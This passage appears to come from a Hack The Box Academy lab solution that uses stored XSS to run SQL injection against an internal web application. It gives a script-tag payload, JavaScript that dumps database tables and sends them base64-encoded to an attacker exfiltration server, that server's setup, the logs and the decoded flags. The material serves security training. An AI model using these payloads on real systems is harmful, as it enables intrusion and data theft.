10.129.68.105 - - [28/Jan/2025 02:16:59] "GET /exfil?r=eyJ1c2VycyI6W3siZW1haWwiOiJhZG1pbkB2dWxuZXJhYmxlc2l0ZS5odGIiLCJwYXNzd29yZCI6IkhUQntmYjEzMTRmNTMzYmYxYzI1Nzk5N2UyNWQ4MWI2MDQ5Y30iLCJ1c2VybmFtZSI6ImFkbWluIn1dfQo= HTTP/1.1" 404 -
```

Decoding the data reveals the flag:

Code: shell

```shell
echo eyJ1c2VycyI6W3siZW1haWwiOiJhZG1pbkB2dWxuZXJhYmxlc2l0ZS5odGIiLCJwYXNzd29yZCI6IkhUQntmYjEzMTRmNTMzYmYxYzI1Nzk5N2UyNWQ4MWI2MDQ5Y30iLCJ1c2VybmFtZSI6ImFkbWluIn1dfQo= | base64 -d | jq .
```

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-vhzoopvc62]─[~]
└──╼ [★]$ echo eyJ1c2VycyI6W3siZW1haWwiOiJhZG1pbkB2dWxuZXJhYmxlc2l0ZS5odGIiLCJwYXNzd29yZCI6IkhUQntmYjEzMTRmNTMzYmYxYzI1Nzk5N2UyNWQ4MWI2MDQ5Y30iLCJ1c2VybmFtZSI6ImFkbWluIn1dfQo= | base64 -d | jq .

{
  "users": [
    {
      "email": "admin@vulnerablesite.htb",
      "password": "HTB{fb1314f533bf1c257997e25d81b6049c}",
      "username": "admin"
    }
  ]
}
```

Answer: `HTB{fb1314f533bf1c257997e25d81b6049c}`

# Exploiting internal Web Applications I

## Question 1

### "Exploit the XSS vulnerability to target the internal web application and obtain the flag."

Students need to first add the necessary vHosts to their `/etc/hosts` file:

Code: shell

```shell
sudo sh -c 'echo "STMIP exploitserver.htb internal-webapps-1.htb" >> /etc/hosts'
```

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-yyfnbxxa3q]─[~]
└──╼ [★]$ sudo sh -c 'echo "10.129.177.173 exploitserver.htb internal-webapps-1.htb" >> /etc/hosts'
```

Next, students need to log in to the vulnerable site (`https://internal-webapps-1.htb`) using the credentials `htb-stdnt:Academy_student!`. Subsequently, students need to submit their base XSS payload as a guestbook entry:

Code: html

```html
<script src="https://exploitserver.htb/exploit"></script>
```

![[HTB Solutions/CWEE/z. images/0bf1eb612e42a55fbbb40606a7b4c2cc_MD5.jpg]]

Once submitted, students need to prepare a payload on the exploit server (`https://exploitserver.htb`), attempting to enumerate tables of the `internal.internal-webapps-1.htb` app by way of SQL injection:

Code: js

```js
var xhr = new XMLHttpRequest();
var params = \`uname=${encodeURIComponent("' UNION SELECT 1,2,3,group_concat(tbl_name) FROM sqlite_master-- -")}&pass=x\`;
xhr.open('POST', 'https://internal.internal-webapps-1.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);

var exfil = new XMLHttpRequest();
exfil.open("GET", "https://PWNIP:PWNPO/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

Students need to create a Python script serving as an HTTPS server:

Code: shell

```shell
cat << EOF > server.py
from http import server
import ssl

httpd = server.HTTPServer(('0.0.0.0', PWNPO), server.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
EOF
```

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-5mnalktjic]─[~]
└──╼ [★]$ cat << EOF > server.py
from http import server
import ssl

httpd = server.HTTPServer(('0.0.0.0', 4443), server.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
EOF
```

Subsequently, students will generate a self-signed certificate with blank information using `openssl`:

Code: shell

```shell
openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
```

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-5mnalktjic]─[~]
└──╼ [★]$ openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes

<SNIP>

-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:
```

Students will start the HTTPS Python server:

Code: shell

```shell
python3 server.py
```

```
┌─[eu-academy-5]─[10.10.14.45]─[htb-ac-8414@htb-pktwoi3cwr]─[~]
└──╼ [★]$ python3 server.py 

/home/htb-ac-8414/server.py:5: DeprecationWarning: ssl.wrap_socket() is deprecated, use SSLContext.wrap_socket()
  httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
```

Students need to wait a few moments before checking the exfiltration server:

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-yyfnbxxa3q]─[~]
└──╼ [★]$ python3 server.py

/home/htb-ac-8414/server.py:5: DeprecationWarning: ssl.wrap_socket() is deprecated, use SSLContext.wrap_socket()
  httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
  
10.129.177.173 - - [28/Jan/2025 03:01:11] code 404, message File not found
10.129.177.173 - - [28/Jan/2025 03:01:11] "GET /exfil?r=PCFET0NUWVBFIGh0bWw+CjxodG1sPgoKPGhlYWQ+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEiPgo8L2hlYWQ+Cgo8Ym9keT4KCiAgICA8aDI+Q2hlY2sgVXNlciBEZXRhaWxzPC9oMj4KCiAgICA8ZGl2IGNsYXNzPSJtb2RhbCI+CiAgICAgICAgKDEsIDIsIDMsICYjMzk7dXNlcnMsc2VjcmV0ZGF0YSYjMzk7KQogICAgPC9kaXY+CgogICAgPGRpdiBjbGFzcz0ibW9kYWwiPgoKICAgICAgICA8Zm9ybSBhY3Rpb249Ii9jaGVjayIgbWV0aG9kPSJwb3N0Ij4KCiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJ1bmFtZSI+PGI+VXNlcm5hbWU8L2I+PC9sYWJlbD4KICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBwbGFjZWhvbGRlcj0iRW50ZXIgVXNlcm5hbWUiIG5hbWU9InVuYW1lIiByZXF1aXJlZD4KCiAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJwc3ciPjxiPlBhc3N3b3JkPC9iPjwvbGFiZWw+CiAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0icGFzc3dvcmQiIHBsYWNlaG9sZGVyPSJFbnRlciBQYXNzd29yZCIgbmFtZT0icGFzcyIgcmVxdWlyZWQ+CgogICAgICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiPkxvZ2luPC9idXR0b24+CiAgICAgICAgICAgICAgICA8bGFiZWw+CiAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImNoZWNrYm94IiBjaGVja2VkPSJjaGVja2VkIiBuYW1lPSJyZW1lbWJlciI+IFJlbWVtYmVyIG1lCiAgICAgICAgICAgICAgICA8L2xhYmVsPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Zvcm0+CiAgICA8L2Rpdj4KCjwvYm9keT4KCjwvaHRtbD4= HTTP/1.1" 404 -
```

Students need to decode the Base64 encoded data in the response:

Code: shell

```shell
echo PCFET0NUWVBFIGh0bWw+CjxodG1sPgoKPGhlYWQ+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEiPgo8L2hlYWQ+Cgo8Ym9keT4KCiAgICA8aDI+Q2hlY2sgVXNlciBEZXRhaWxzPC9oMj4KCiAgICA8ZGl2IGNsYXNzPSJtb2RhbCI+CiAgICAgICAgKDEsIDIsIDMsICYjMzk7dXNlcnMsc2VjcmV0ZGF0YSYjMzk7KQogICAgPC9kaXY+CgogICAgPGRpdiBjbGFzcz0ibW9kYWwiPgoKICAgICAgICA8Zm9ybSBhY3Rpb249Ii9jaGVjayIgbWV0aG9kPSJwb3N0Ij4KCiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJ1bmFtZSI+PGI+VXNlcm5hbWU8L2I+PC9sYWJlbD4KICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBwbGFjZWhvbGRlcj0iRW50ZXIgVXNlcm5hbWUiIG5hbWU9InVuYW1lIiByZXF1aXJlZD4KCiAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJwc3ciPjxiPlBhc3N3b3JkPC9iPjwvbGFiZWw+CiAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0icGFzc3dvcmQiIHBsYWNlaG9sZGVyPSJFbnRlciBQYXNzd29yZCIgbmFtZT0icGFzcyIgcmVxdWlyZWQ+CgogICAgICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiPkxvZ2luPC9idXR0b24+CiAgICAgICAgICAgICAgICA8bGFiZWw+CiAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImNoZWNrYm94IiBjaGVja2VkPSJjaGVja2VkIiBuYW1lPSJyZW1lbWJlciI+IFJlbWVtYmVyIG1lCiAgICAgICAgICAgICAgICA8L2xhYmVsPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Zvcm0+CiAgICA8L2Rpdj4KCjwvYm9keT4KCjwvaHRtbD4= | base64 -d
```

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-yyfnbxxa3q]─[~]
└──╼ [★]$ echo PCFET0NUWVBFIGh0bWw+CjxodG1sPgoKPGhlYWQ+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEiPgo8L2hlYWQ+Cgo8Ym9keT4KCiAgICA8aDI+Q2hlY2sgVXNlciBEZXRhaWxzPC9oMj4KCiAgICA8ZGl2IGNsYXNzPSJtb2RhbCI+CiAgICAgICAgKDEsIDIsIDMsICYjMzk7dXNlcnMsc2VjcmV0ZGF0YSYjMzk7KQogICAgPC9kaXY+CgogICAgPGRpdiBjbGFzcz0ibW9kYWwiPgoKICAgICAgICA8Zm9ybSBhY3Rpb249Ii9jaGVjayIgbWV0aG9kPSJwb3N0Ij4KCiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJ1bmFtZSI+PGI+VXNlcm5hbWU8L2I+PC9sYWJlbD4KICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBwbGFjZWhvbGRlcj0iRW50ZXIgVXNlcm5hbWUiIG5hbWU9InVuYW1lIiByZXF1aXJlZD4KCiAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJwc3ciPjxiPlBhc3N3b3JkPC9iPjwvbGFiZWw+CiAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0icGFzc3dvcmQiIHBsYWNlaG9sZGVyPSJFbnRlciBQYXNzd29yZCIgbmFtZT0icGFzcyIgcmVxdWlyZWQ+CgogICAgICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiPkxvZ2luPC9idXR0b24+CiAgICAgICAgICAgICAgICA8bGFiZWw+CiAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImNoZWNrYm94IiBjaGVja2VkPSJjaGVja2VkIiBuYW1lPSJyZW1lbWJlciI+IFJlbWVtYmVyIG1lCiAgICAgICAgICAgICAgICA8L2xhYmVsPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Zvcm0+CiAgICA8L2Rpdj4KCjwvYm9keT4KCjwvaHRtbD4= | base64 -d

<!DOCTYPE html>
<html>

<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
</head>

<body>

    <h2>Check User Details</h2>

    <div class="modal">
        (1, 2, 3, &#39;users,secretdata&#39;)
    </div>

<SNIP>
```

It is revealed the database contains two tables, `users` and `secretdata`. Subsequently, students need to adjust their payload to enumerate the schema of the `secretdata` table:

Code: js

```js
var xhr = new XMLHttpRequest();
var params = \`uname=${encodeURIComponent("' UNION SELECT 1,2,3,group_concat(sql) FROM sqlite_master WHERE name='secretdata'-- -")}&pass=x\`;
xhr.open('POST', 'https://internal.internal-webapps-1.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);

var exfil = new XMLHttpRequest();
exfil.open("GET", "https://PWNIP:PWNPO/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

Again, students need to wait a few moments before checking the exfiltration server:

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-yyfnbxxa3q]─[~]
└──╼ [★]$ python3 server.py 

/home/htb-ac-8414/server.py:5: DeprecationWarning: ssl.wrap_socket() is deprecated, use SSLContext.wrap_socket()
  httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)

<SNIP>

10.129.177.173 - - [28/Jan/2025 03:04:12] code 404, message File not found
10.129.177.173 - - [28/Jan/2025 03:04:12] "GET /exfil?r=PCFET0NUWVBFIGh0bWw+CjxodG1sPgoKPGhlYWQ+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEiPgo8L2hlYWQ+Cgo8Ym9keT4KCiAgICA8aDI+Q2hlY2sgVXNlciBEZXRhaWxzPC9oMj4KCiAgICA8ZGl2IGNsYXNzPSJtb2RhbCI+CiAgICAgICAgKDEsIDIsIDMsICYjMzk7Q1JFQVRFIFRBQkxFIGBzZWNyZXRkYXRhYCAoXG4gIGBpZGAgaW50KDExKSBOT1QgTlVMTCxcbiAgYGRhdGFgIGxvbmd0ZXh0IE5PVCBOVUxMXG4pJiMzOTspCiAgICA8L2Rpdj4KCiAgICA8ZGl2IGNsYXNzPSJtb2RhbCI+CgogICAgICAgIDxmb3JtIGFjdGlvbj0iL2NoZWNrIiBtZXRob2Q9InBvc3QiPgoKICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgICAgICAgICAgICAgIDxsYWJlbCBmb3I9InVuYW1lIj48Yj5Vc2VybmFtZTwvYj48L2xhYmVsPgogICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIHBsYWNlaG9sZGVyPSJFbnRlciBVc2VybmFtZSIgbmFtZT0idW5hbWUiIHJlcXVpcmVkPgoKICAgICAgICAgICAgICAgIDxsYWJlbCBmb3I9InBzdyI+PGI+UGFzc3dvcmQ8L2I+PC9sYWJlbD4KICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgcGxhY2Vob2xkZXI9IkVudGVyIFBhc3N3b3JkIiBuYW1lPSJwYXNzIiByZXF1aXJlZD4KCiAgICAgICAgICAgICAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCI+TG9naW48L2J1dHRvbj4KICAgICAgICAgICAgICAgIDxsYWJlbD4KICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iY2hlY2tib3giIGNoZWNrZWQ9ImNoZWNrZWQiIG5hbWU9InJlbWVtYmVyIj4gUmVtZW1iZXIgbWUKICAgICAgICAgICAgICAgIDwvbGFiZWw+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZm9ybT4KICAgIDwvZGl2PgoKPC9ib2R5PgoKPC9odG1sPg== HTTP/1.1" 404 -
```

Students need to decode the data:

Code: shell

```shell
echo PCFET0NUWVBFIGh0bWw+CjxodG1sPgoKPGhlYWQ+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEiPgo8L2hlYWQ+Cgo8Ym9keT4KCiAgICA8aDI+Q2hlY2sgVXNlciBEZXRhaWxzPC9oMj4KCiAgICA8ZGl2IGNsYXNzPSJtb2RhbCI+CiAgICAgICAgKDEsIDIsIDMsICYjMzk7Q1JFQVRFIFRBQkxFIGBzZWNyZXRkYXRhYCAoXG4gIGBpZGAgaW50KDExKSBOT1QgTlVMTCxcbiAgYGRhdGFgIGxvbmd0ZXh0IE5PVCBOVUxMXG4pJiMzOTspCiAgICA8L2Rpdj4KCiAgICA8ZGl2IGNsYXNzPSJtb2RhbCI+CgogICAgICAgIDxmb3JtIGFjdGlvbj0iL2NoZWNrIiBtZXRob2Q9InBvc3QiPgoKICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgICAgICAgICAgICAgIDxsYWJlbCBmb3I9InVuYW1lIj48Yj5Vc2VybmFtZTwvYj48L2xhYmVsPgogICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIHBsYWNlaG9sZGVyPSJFbnRlciBVc2VybmFtZSIgbmFtZT0idW5hbWUiIHJlcXVpcmVkPgoKICAgICAgICAgICAgICAgIDxsYWJlbCBmb3I9InBzdyI+PGI+UGFzc3dvcmQ8L2I+PC9sYWJlbD4KICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgcGxhY2Vob2xkZXI9IkVudGVyIFBhc3N3b3JkIiBuYW1lPSJwYXNzIiByZXF1aXJlZD4KCiAgICAgICAgICAgICAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCI+TG9naW48L2J1dHRvbj4KICAgICAgICAgICAgICAgIDxsYWJlbD4KICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iY2hlY2tib3giIGNoZWNrZWQ9ImNoZWNrZWQiIG5hbWU9InJlbWVtYmVyIj4gUmVtZW1iZXIgbWUKICAgICAgICAgICAgICAgIDwvbGFiZWw+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZm9ybT4KICAgIDwvZGl2PgoKPC9ib2R5PgoKPC9odG1sPg== | base64 -d
```

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-yyfnbxxa3q]─[~]
└──╼ [★]$ echo PCFET0NUWVBFIGh0bWw+CjxodG1sPgoKPGhlYWQ+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEiPgo8L2hlYWQ+Cgo8Ym9keT4KCiAgICA8aDI+Q2hlY2sgVXNlciBEZXRhaWxzPC9oMj4KCiAgICA8ZGl2IGNsYXNzPSJtb2RhbCI+CiAgICAgICAgKDEsIDIsIDMsICYjMzk7Q1JFQVRFIFRBQkxFIGBzZWNyZXRkYXRhYCAoXG4gIGBpZGAgaW50KDExKSBOT1QgTlVMTCxcbiAgYGRhdGFgIGxvbmd0ZXh0IE5PVCBOVUxMXG4pJiMzOTspCiAgICA8L2Rpdj4KCiAgICA8ZGl2IGNsYXNzPSJtb2RhbCI+CgogICAgICAgIDxmb3JtIGFjdGlvbj0iL2NoZWNrIiBtZXRob2Q9InBvc3QiPgoKICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgICAgICAgICAgICAgIDxsYWJlbCBmb3I9InVuYW1lIj48Yj5Vc2VybmFtZTwvYj48L2xhYmVsPgogICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIHBsYWNlaG9sZGVyPSJFbnRlciBVc2VybmFtZSIgbmFtZT0idW5hbWUiIHJlcXVpcmVkPgoKICAgICAgICAgICAgICAgIDxsYWJlbCBmb3I9InBzdyI+PGI+UGFzc3dvcmQ8L2I+PC9sYWJlbD4KICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgcGxhY2Vob2xkZXI9IkVudGVyIFBhc3N3b3JkIiBuYW1lPSJwYXNzIiByZXF1aXJlZD4KCiAgICAgICAgICAgICAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCI+TG9naW48L2J1dHRvbj4KICAgICAgICAgICAgICAgIDxsYWJlbD4KICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iY2hlY2tib3giIGNoZWNrZWQ9ImNoZWNrZWQiIG5hbWU9InJlbWVtYmVyIj4gUmVtZW1iZXIgbWUKICAgICAgICAgICAgICAgIDwvbGFiZWw+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZm9ybT4KICAgIDwvZGl2PgoKPC9ib2R5PgoKPC9odG1sPg== | base64 -d

<!DOCTYPE html>
<html>

<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
</head>

<body>

    <h2>Check User Details</h2>

    <div class="modal">
        (1, 2, 3, &#39;CREATE TABLE \`secretdata\` (\n  \`id\` int(11) NOT NULL,\n  \`data\` longtext NOT NULL\n)&#39;)
    </div>

<SNIP>
```

It is revealed that the `secredata` table has two columns, `id` and `data`. Therefore, students need to use this information to adjust their payload, dumping the contents of the table by including the column names in the `UNION SELECT` query:

Code: js

```js
var xhr = new XMLHttpRequest();
var params = \`uname=${encodeURIComponent("' UNION SELECT id,data,1,2 FROM secretdata-- -")}&pass=x\`;
xhr.open('POST', 'https://internal.internal-webapps-1.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);

var exfil = new XMLHttpRequest();
exfil.open("GET", "https://PWNIP:PWNPO/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

Saving the payload to the exploit server, students need to wait a few moments before checking the exfiltration server:

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-yyfnbxxa3q]─[~]
└──╼ [★]$ python3 server.py 

/home/htb-ac-8414/server.py:5: DeprecationWarning: ssl.wrap_socket() is deprecated, use SSLContext.wrap_socket()
  httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
  
10.129.177.173 - - [28/Jan/2025 03:08:20] code 404, message File not found
10.129.177.173 - - [28/Jan/2025 03:08:20] "GET /exfil?r=PCFET0NUWVBFIGh0bWw+CjxodG1sPgoKPGhlYWQ+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEiPgo8L2hlYWQ+Cgo8Ym9keT4KCiAgICA8aDI+Q2hlY2sgVXNlciBEZXRhaWxzPC9oMj4KCiAgICA8ZGl2IGNsYXNzPSJtb2RhbCI+CiAgICAgICAgKDEsICYjMzk7SFRCezVhNjBmYTUwMWUxODY2NjI2ZTk2MTE1YjU5OGQ0NTQxfSYjMzk7LCAxLCAyKQogICAgPC9kaXY+CgogICAgPGRpdiBjbGFzcz0ibW9kYWwiPgoKICAgICAgICA8Zm9ybSBhY3Rpb249Ii9jaGVjayIgbWV0aG9kPSJwb3N0Ij4KCiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJ1bmFtZSI+PGI+VXNlcm5hbWU8L2I+PC9sYWJlbD4KICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBwbGFjZWhvbGRlcj0iRW50ZXIgVXNlcm5hbWUiIG5hbWU9InVuYW1lIiByZXF1aXJlZD4KCiAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJwc3ciPjxiPlBhc3N3b3JkPC9iPjwvbGFiZWw+CiAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0icGFzc3dvcmQiIHBsYWNlaG9sZGVyPSJFbnRlciBQYXNzd29yZCIgbmFtZT0icGFzcyIgcmVxdWlyZWQ+CgogICAgICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiPkxvZ2luPC9idXR0b24+CiAgICAgICAgICAgICAgICA8bGFiZWw+CiAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImNoZWNrYm94IiBjaGVja2VkPSJjaGVja2VkIiBuYW1lPSJyZW1lbWJlciI+IFJlbWVtYmVyIG1lCiAgICAgICAgICAgICAgICA8L2xhYmVsPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Zvcm0+CiAgICA8L2Rpdj4KCjwvYm9keT4KCjwvaHRtbD4= HTTP/1.1" 404 -
```

Finally, students need to decode the data to find the flag:

Code: shell

```shell
echo PCFET0NUWVBFIGh0bWw+CjxodG1sPgoKPGhlYWQ+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEiPgo8L2hlYWQ+Cgo8Ym9keT4KCiAgICA8aDI+Q2hlY2sgVXNlciBEZXRhaWxzPC9oMj4KCiAgICA8ZGl2IGNsYXNzPSJtb2RhbCI+CiAgICAgICAgKDEsICYjMzk7SFRCezVhNjBmYTUwMWUxODY2NjI2ZTk2MTE1YjU5OGQ0NTQxfSYjMzk7LCAxLCAyKQogICAgPC9kaXY+CgogICAgPGRpdiBjbGFzcz0ibW9kYWwiPgoKICAgICAgICA8Zm9ybSBhY3Rpb249Ii9jaGVjayIgbWV0aG9kPSJwb3N0Ij4KCiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJ1bmFtZSI+PGI+VXNlcm5hbWU8L2I+PC9sYWJlbD4KICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBwbGFjZWhvbGRlcj0iRW50ZXIgVXNlcm5hbWUiIG5hbWU9InVuYW1lIiByZXF1aXJlZD4KCiAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJwc3ciPjxiPlBhc3N3b3JkPC9iPjwvbGFiZWw+CiAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0icGFzc3dvcmQiIHBsYWNlaG9sZGVyPSJFbnRlciBQYXNzd29yZCIgbmFtZT0icGFzcyIgcmVxdWlyZWQ+CgogICAgICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiPkxvZ2luPC9idXR0b24+CiAgICAgICAgICAgICAgICA8bGFiZWw+CiAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImNoZWNrYm94IiBjaGVja2VkPSJjaGVja2VkIiBuYW1lPSJyZW1lbWJlciI+IFJlbWVtYmVyIG1lCiAgICAgICAgICAgICAgICA8L2xhYmVsPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Zvcm0+CiAgICA8L2Rpdj4KCjwvYm9keT4KCjwvaHRtbD4= | base64 -d
```

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-yyfnbxxa3q]─[~]
└──╼ [★]$ echo PCFET0NUWVBFIGh0bWw+CjxodG1sPgoKPGhlYWQ+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEiPgo8L2hlYWQ+Cgo8Ym9keT4KCiAgICA8aDI+Q2hlY2sgVXNlciBEZXRhaWxzPC9oMj4KCiAgICA8ZGl2IGNsYXNzPSJtb2RhbCI+CiAgICAgICAgKDEsICYjMzk7SFRCezVhNjBmYTUwMWUxODY2NjI2ZTk2MTE1YjU5OGQ0NTQxfSYjMzk7LCAxLCAyKQogICAgPC9kaXY+CgogICAgPGRpdiBjbGFzcz0ibW9kYWwiPgoKICAgICAgICA8Zm9ybSBhY3Rpb249Ii9jaGVjayIgbWV0aG9kPSJwb3N0Ij4KCiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJ1bmFtZSI+PGI+VXNlcm5hbWU8L2I+PC9sYWJlbD4KICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBwbGFjZWhvbGRlcj0iRW50ZXIgVXNlcm5hbWUiIG5hbWU9InVuYW1lIiByZXF1aXJlZD4KCiAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJwc3ciPjxiPlBhc3N3b3JkPC9iPjwvbGFiZWw+CiAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0icGFzc3dvcmQiIHBsYWNlaG9sZGVyPSJFbnRlciBQYXNzd29yZCIgbmFtZT0icGFzcyIgcmVxdWlyZWQ+CgogICAgICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiPkxvZ2luPC9idXR0b24+CiAgICAgICAgICAgICAgICA8bGFiZWw+CiAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImNoZWNrYm94IiBjaGVja2VkPSJjaGVja2VkIiBuYW1lPSJyZW1lbWJlciI+IFJlbWVtYmVyIG1lCiAgICAgICAgICAgICAgICA8L2xhYmVsPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Zvcm0+CiAgICA8L2Rpdj4KCjwvYm9keT4KCjwvaHRtbD4= | base64 -d

<!DOCTYPE html>
<html>

<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
</head>

<body>

    <h2>Check User Details</h2>

    <div class="modal">
        (1, &#39;HTB{5a60fa501e1866626e96115b598d4541}&#39;, 1, 2)
    </div>

<SNIP>
```

